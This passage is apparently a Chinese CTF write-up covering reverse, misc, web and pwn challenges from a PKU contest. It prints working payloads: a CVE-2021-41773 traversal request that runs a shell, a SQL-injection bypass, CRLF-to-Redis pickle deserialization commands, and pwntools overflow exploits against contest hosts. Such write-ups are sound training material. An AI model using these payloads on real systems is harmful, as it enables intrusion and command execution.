class=\"number\">32</span>)</span><br><span class=\"line\">v8=BitVec(<span class=\"string\">&#x27;v8&#x27;</span>,<span class=\"number\">32</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s.add(v5 + <span class=\"number\">1380855784</span> == <span class=\"number\">907301700</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s.add((v6 | <span class=\"number\">0x8E03BEC3</span>) - <span class=\"number\">3</span> * (v6 &amp; <span class=\"number\">0x71FC413C</span>) + v6 == -<span class=\"number\">1876131848</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s.add(v7&lt;=<span class=\"number\">0x10000000</span>)</span><br><span class=\"line\">s.add(<span class=\"number\">4</span> * ((~v7 &amp; <span class=\"number\">0xA8453437</span>) + <span class=\"number\">2</span> * ~(~v7 | <span class=\"number\">0xA8453437</span>))</span><br><span class=\"line\">     + -<span class=\"number\">3</span> * (~v7 | <span class=\"number\">0xA8453437</span>)</span><br><span class=\"line\">     + <span class=\"number\">3</span> * ~(v7 | <span class=\"number\">0xA8453437</span>)</span><br><span class=\"line\">     - (-<span class=\"number\">10</span> * (v7 &amp; <span class=\"number\">0xA8453437</span>)</span><br><span class=\"line\">      + (v7 ^ <span class=\"number\">0xA8453437</span>)) == <span class=\"number\">551387557</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s.add(v8&lt;=<span class=\"number\">0x10000000</span>)</span><br><span class=\"line\">s.add(<span class=\"number\">11</span> * ~(v8 ^ <span class=\"number\">0xE33B67BD</span>)</span><br><span class=\"line\">     + <span class=\"number\">4</span> * ~(~v8 | <span class=\"number\">0xE33B67BD</span>)</span><br><span class=\"line\">     - (<span class=\"number\">6</span> * (v8&amp; <span class=\"number\">0xE33B67BD</span>)</span><br><span class=\"line\">      + <span class=\"number\">12</span> * ~(v8 | <span class=\"number\">0xE33B67BD</span>))</span><br><span class=\"line\">     + <span class=\"number\">3</span> * (v8 &amp; <span class=\"number\">0xD2C7FC0C</span>)</span><br><span class=\"line\">     + -<span class=\"number\">5</span> * v8</span><br><span class=\"line\">     - <span class=\"number\">2</span> * ~(v8 | <span class=\"number\">0xD2C7FC0C</span>)</span><br><span class=\"line\">     + ~(v8 | <span class=\"number\">0x2D3803F3</span>)</span><br><span class=\"line\">     + <span class=\"number\">4</span> * (v8 &amp; <span class=\"number\">0x2D3803F3</span>)</span><br><span class=\"line\">     - -<span class=\"number\">2</span> * (v8 | <span class=\"number\">0x2D3803F3</span>) == -<span class=\"number\">837785892</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s.check())<span class=\"comment\">#check是保证有解</span></span><br><span class=\"line\">answer=s.model()<span class=\"comment\">#model是输出运算结果</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(answer)</span><br><span class=\"line\"></span><br><span class=\"line\">data=[<span class=\"number\">3821413212</span>,<span class=\"number\">98124621</span>,<span class=\"number\">78769651</span>,<span class=\"number\">67321987</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;flag&#123;&#x27;</span>+<span class=\"string\">&#x27;%08x-&#x27;</span>%data[<span class=\"number\">0</span>]+<span class=\"string\">&#x27;%08x-&#x27;</span>%data[<span class=\"number\">1</span>]+<span class=\"string\">&#x27;%08x-&#x27;</span>%data[<span class=\"number\">2</span>]+<span class=\"string\">&#x27;%08x&#x27;</span>%data[<span class=\"number\">3</span>]+<span class=\"string\">&#x27;&#125;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"misc-签到\"><a class=\"markdownIt-Anchor\" href=\"#misc-签到\">#</a> Misc - 签到</h2>\n<p>一张 GIF 图，拖到 pr 里面一帧一帧看，第一帧是：Flag is the ROT13 of …<br>\n 之后的每一帧合并起来就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">synt&#123;jrypbzr-gb-pbzcrgvgvba&#125;</span><br></pre></td></tr></table></figure>\n<p>然后通过 ROT13 解密，得到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;welcome-to-competition&#125; </span><br></pre></td></tr></table></figure>\n<h2 id=\"misc-easyshell复现\"><a class=\"markdownIt-Anchor\" href=\"#misc-easyshell复现\">#</a> Misc-easyshell（复现）</h2>\n<p>冰蝎这个 webShell 的流量分析，推测是冰蝎 3.0，使用默认密码 rebeyond 的 md5 加密然后取前 16 位作为 key 进行 AES 解密，或者直接通过 （ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21lbG9keTI3L2JlaGluZGVyX2RlY3J5cHQ=\">https://github.com/melody27/behinder_decrypt</span> ）  进行解密：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 py_decrypt.py -f easyshell.pcap | tee result</span><br></pre></td></tr></table></figure>\n<p>获得相应的请求和响应的内容。<br>\n通过如下两个命令分别提取文件的信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat result | grep &#123;\\&quot;msg\\&quot;:\\&quot;</span><br><span class=\"line\">cat result | grep $mode=\\&quot;ZG93bmxvYWRQYXJ0\\&quot;;</span><br></pre></td></tr></table></figure>\n<p>之后能够获取到一个压缩包，之后通过创建一个 CRC 值与获取的压缩包 CRC 值相同的 zip 包，然后进行明文攻击，最后获得 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;70854278-ea0c-462e-bc18-468c7a04a505&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"misc-gateway复现\"><a class=\"markdownIt-Anchor\" href=\"#misc-gateway复现\">#</a> Misc-Gateway（复现）</h2>\n<p>在附件 baseinfoSet.json 中有个 “baseinfoSet_TELECOMPASSWORD”: “106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;5 6&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;”,<br>\n 在网上搜索 baseinfoSet_TELECOMPASSWORD   存在解密脚本，直接解密得到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;ad1985868133e8cf1828cb84adbe5a5b&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#x27;106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;&#x27;[:-1]    # &quot;baseinfoSet_TELECOMPASSWORD&quot;:&quot;114&amp;73&amp;55&amp;110&amp;69&amp;37&amp;53&amp;113&amp;&quot;</span><br><span class=\"line\">list=map(int,code.split(&#x27;&amp;&#x27;))</span><br><span class=\"line\">result=[]</span><br><span class=\"line\">for i in list:</span><br><span class=\"line\">    if i &gt; 57:</span><br><span class=\"line\">       i-=4</span><br><span class=\"line\">    result.append(chr(i))</span><br><span class=\"line\">print (&#x27;&#x27;.join(result))</span><br></pre></td></tr></table></figure>\n<h2 id=\"misc-apache复现\"><a class=\"markdownIt-Anchor\" href=\"#misc-apache复现\">#</a> Misc-Apache（复现）</h2>\n<p>在博客里直接搜索 httpd:2.4.49-buster 漏洞  可知，有个 CVE-2021-41773 的路径穿越漏洞，相关连接如下<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk=\"> Apache HTTP Server 路径穿越漏洞复现 (CVE-2021-41773)-CSDN 博客</span><br>\n所以根据 python 的源码，构造如下的包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /nc HTTP/2</span><br><span class=\"line\">Host: prob01-8k743yxw.contest.pku.edu.cn</span><br><span class=\"line\">Content-Length: 470</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;port&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">80</span><br><span class=\"line\">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class=\"line\">Host: aaaa</span><br><span class=\"line\">User-Agent: curl/7.68.0</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Content-Length: 45</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\"></span><br><span class=\"line\">echo Content-Type:text/plain; echo; cat /flag;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>\n<p>通过 burp 发包得到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;wHaTaaPaCheRcE&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"web-phpsql\"><a class=\"markdownIt-Anchor\" href=\"#web-phpsql\">#</a> Web-phpsql</h2>\n<p>题目开始是个登陆框，根据题目，应该是个 sql 注入，先注册账号，然后登陆注册的账号看看情况，出现一个弹窗，表示只有 admin 才能拿到一些内容，那么猜测应该是万能密码登陆 admin 账号。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/2f4ae7a99b08a15aa92c69ac1f4e3e9b.png\" alt=\"image.png\"><br>\n 当 payload 为  1’ or 1=1 #  的时候，回显是 hacker，多次尝试之后，发现只过滤了空格，内联注释绕过，构造 payload 为：1’/<strong>/Or/</strong>/1/<strong>/like/</strong>/1/**/# 成功绕过，在经过两次离谱的弹窗之后，成功拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;KTFoYJlPMrqDW6fBGwGG&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"web-pyssrf复现\"><a class=\"markdownIt-Anchor\" href=\"#web-pyssrf复现\">#</a> Web-pyssrf（复现）</h2>\n<p>访问 source 路由，拿到 python 源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">from</span> redis <span class=\"keyword\">import</span> Redis</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">redis = Redis(host=<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, port=<span class=\"number\">6379</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_result</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class=\"line\">    res=redis.get(url_key)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pickle.loads(base64.b64decode(res))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)</span><br><span class=\"line\">            info = urllib.request.urlopen(url)</span><br><span class=\"line\">            res = info.read()</span><br><span class=\"line\">            pickres=pickle.dumps(res)</span><br><span class=\"line\">            b64res=base64.b64encode(pickres)</span><br><span class=\"line\">            redis.<span class=\"built_in\">set</span>(url_key,b64res,ex=<span class=\"number\">300</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res</span><br><span class=\"line\">        <span class=\"keyword\">except</span> urllib.error.URLError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello</span>():</span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">&quot;url&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span></span><br><span class=\"line\"><span class=\"string\">    %s</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span> % get_result(<span class=\"string\">&#x27;http://&#x27;</span>+url).decode(encoding=<span class=\"string\">&#x27;utf8&#x27;</span>,errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/source&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">source</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br></pre></td></tr></table></figure>\n<p>看上去是一个 pickle 反序列化加上 ssrf 的洞，具体啥原理还不是很懂，先写下参考地址：漏洞是叫 CRLF 编号为 CVE 2019-9947，参考资料可以是<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpcnU5OTcyL2FydGljbGUvZGV0YWlscy8xMjgzNDM2NzY=\"> Python urllib CRLF 注入漏洞小结_urllib crlf 漏洞 - CSDN 博客</span><br>\n首先是构造 key 值：<br>\nmd5(‘<span class=\"exturl\" data-url=\"aHR0cDovLzE=\">http://1</span>’)=22d474190b1889d3373fa4f9334e979c<br>\n** 用脚本构造 pickle 的反序列数据 ** :</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64 </span><br><span class=\"line\">a=<span class=\"string\">b&#x27;&#x27;&#x27;cos system</span></span><br><span class=\"line\"><span class=\"string\">(S&#x27;command here&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tR.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure>\n<p>因为采用的是 flask 框架，最简单获得回显的方式就是写文件到静态目录</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">a=<span class=\"string\">b&#x27;&#x27;&#x27;cos</span></span><br><span class=\"line\"><span class=\"string\">system</span></span><br><span class=\"line\"><span class=\"string\">(S&#x27;mkdir static&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tR.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure>\n<p>再将 flag 的内容重定向到 static/1.txt 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">a=<span class=\"string\">b&#x27;&#x27;&#x27;cos</span></span><br><span class=\"line\"><span class=\"string\">system</span></span><br><span class=\"line\"><span class=\"string\">(S&#x27;cat /flag&gt;static/1.txt&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tR.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure>\n<p>所以，payload 依次为：<br>\n写入 redis 内缓存，创建静态目录 static</p>\n<blockquote>\n<p>/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydta2Rp<br>\nciBzdGF0aWMnCnRSLg%3d%3d%22%0d%0apaddins</p>\n</blockquote>\n<p>缓存之后触发反序列化：</p>\n<blockquote>\n<p>/?url=1</p>\n</blockquote>\n<p>读取 flag，并重定向到 /static/1.txt 内：</p>\n<blockquote>\n<p>/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydjYXQg<br>\nL2ZsYWc%2bc3RhdGljLzEudHh0Jwp0Ui4%3d%22%0d%0apaddins</p>\n</blockquote>\n<p>缓存之后触发反序列化：</p>\n<blockquote>\n<p>/?url=1</p>\n</blockquote>\n<p>之后访问 /static/1.txt 拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;qtRqiLrtTp6hoN2RPMti&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwn-babypwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn-babypwn\">#</a> Pwn-babypwn</h2>\n<p>（这个题不知为啥，有种莫名奇妙的感觉，本地无论几次都不同，远程就能通）<br>\n查看开启的保护：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den-virtual-machine:/mnt/shared<span class=\"comment\"># checksec pwn</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/shared/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX unknown - GNU_STACK missing</span><br><span class=\"line\">    PIE:      No <span class=\"title function_ invoke__\">PIE</span> (<span class=\"number\">0x400000</span>)</span><br><span class=\"line\">    Stack:    Executable</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<p>反编译之后，找到漏洞函数 login ()：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_ invoke__\">login</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  char buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  char s1[<span class=\"number\">40</span>]; <span class=\"comment\">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;Enter your username: &quot;</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">read</span>(<span class=\"number\">0</span>, buf, <span class=\"number\">0</span>x40uLL);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;Enter the password: &quot;</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">read</span>(<span class=\"number\">0</span>, s1, <span class=\"number\">0</span>x40uLL);</span><br><span class=\"line\">  v0 = <span class=\"title function_ invoke__\">strcmp</span>(buf, <span class=\"string\">&quot;root&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0 | (unsigned <span class=\"keyword\">int</span>)<span class=\"title function_ invoke__\">strcmp</span>(s1, <span class=\"string\">&quot;!@#$%^&amp;*()_+&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>并且，存在后门函数 sub_401176，地址为 0x401176，所以，根据 gdb 调试，得知缓冲区加上 ebp 的大小为 120 字节，所以 exp 如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn import *</span><br><span class=\"line\"><span class=\"comment\">#io = process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">io = <span class=\"title function_ invoke__\">remote</span>(<span class=\"string\">&#x27;prob07.contest.pku.edu.cn&#x27;</span>,<span class=\"number\">10007</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">backdoor = <span class=\"number\">0x40117a</span>  <span class=\"comment\">#不知道为啥，这里如果是0x401176的话，打不通</span></span><br><span class=\"line\">token = b<span class=\"string\">&quot;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&quot;</span></span><br><span class=\"line\">io.<span class=\"title function_ invoke__\">sendline</span>(token)</span><br><span class=\"line\">io.<span class=\"title function_ invoke__\">recvuntil</span>(b<span class=\"string\">&#x27;Enter your username: &#x27;</span>)</span><br><span class=\"line\">payload = b<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">120</span> + <span class=\"title function_ invoke__\">p64</span>(backdoor)</span><br><span class=\"line\">io.<span class=\"title function_ invoke__\">sendline</span>(payload)</span><br><span class=\"line\">io.<span class=\"title function_ invoke__\">recv</span>()</span><br><span class=\"line\">io.<span class=\"title function_ invoke__\">interactive</span>()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后 flag 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;kooD1EijiemeePh8ieNei2Xol8ich5DE&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwn-login\"><a class=\"markdownIt-Anchor\" href=\"#pwn-login\">#</a> Pwn-Login</h2>\n<p>没有附件 nc 连上多测试几次就会知道 password 多输几个字符就会输出二进制文件<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/bb9e55ffa5a970fe87d400ae5ee87bd1.png\" alt=\"图片.png\"> 多试试 0x28 个字符时能接收到正确的文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;prob04.contest.pku.edu.cn&quot;</span>, <span class=\"number\">10004</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;token: &quot;</span>, <span class=\"string\">b&#x27;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;Username&#x27;</span>, <span class=\"string\">&quot;admin\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;Password&#x27;</span>, <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x28</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;dumped\\n&#x27;</span>)</span><br><span class=\"line\">key = io.recvall()</span><br><span class=\"line\"></span><br><span class=\"line\">fp = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;att&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">fp.write(key)</span><br><span class=\"line\"></span><br><span class=\"line\">os.system(<span class=\"string\">&#x27;chmod 777 att&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" 